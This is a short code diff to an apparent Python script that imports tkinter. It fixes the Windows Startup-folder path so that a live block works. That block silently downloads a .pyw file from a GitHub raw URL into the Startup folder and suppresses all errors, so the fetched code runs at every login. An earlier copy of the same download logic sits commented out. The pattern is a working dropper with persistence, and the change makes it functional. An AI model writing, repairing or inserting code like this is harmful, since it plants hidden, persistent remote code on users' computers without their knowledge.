@@ -8,7 +8,7 @@ from tkinter import messagebox
 
 # Download new ric
 """
-ricpath = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
+ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
 
 try:
     urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric_download.pyw", ricpath)
@@ -16,7 +16,7 @@ except Exception:
     pass
 """
 
-ricpath = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pastedl.pyw"
+ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pastedl.pyw"
 
 try:
     urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/pastedl.pyw", ricpath)
